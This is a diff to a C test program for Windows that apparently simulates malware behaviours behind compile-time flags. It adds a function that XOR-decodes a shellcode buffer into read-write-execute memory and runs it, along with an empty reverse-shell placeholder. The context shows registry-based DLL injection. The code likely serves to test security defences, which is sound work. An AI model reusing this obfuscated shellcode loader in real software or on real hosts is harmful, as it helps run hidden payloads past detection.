@@ -17,6 +17,11 @@ void print_error(const char *status){
 }
 
 // test functions
+
+#if REVERSE_SHELL==1
+
+#endif
+
 #if DLL_INJECT_REGISTRY==1
 /*
 DLLs listed under the registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs 
@@ -148,6 +153,23 @@ void alloc_rwx_call(){
 }
 #endif
 
+#if SHELLCODE_XOR==1 && ALLOC_RWX_XOR_CALL==1
+/*
+Allocates writable and executable memory, writes deobfuscates and runs shellcode.
+*/
+void alloc_rwx_xor_call(){
+	print_status("alloc_rwx_xor_call starts");
+	LPVOID p=VirtualAlloc(NULL,4096,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
+	RtlMoveMemory(p,shellcode_xor,sizeof(shellcode_xor));
+	for (int i=0;i<sizeof(shellcode_xor);i++){
+		((unsigned char *)p)[i]=(unsigned char)(shellcode_xor[i]^XOR_key);
+	}
+	((void(*)())p)();
+	VirtualFree(p,NULL,MEM_RELEASE);
+	print_status("alloc_rwx_xor_call ends");
+}
+#endif
+
 #if WRITE_LOG==1
 /*
 Creates a hidden file in a temporary directory and writes information about the local host.
@@ -227,6 +249,10 @@ int main(int argc,char **argv){
 
 	#if DLL_INJECT_REGISTRY==1
 	dll_inject_registry();
+	#endif
+
+	#if SHELLCODE_XOR==1 && ALLOC_RWX_XOR_CALL==1
+	alloc_rwx_xor_call();
 	#endif
 
 	#if SHELLCODE==1 && ALLOC_RWX_CALL==1
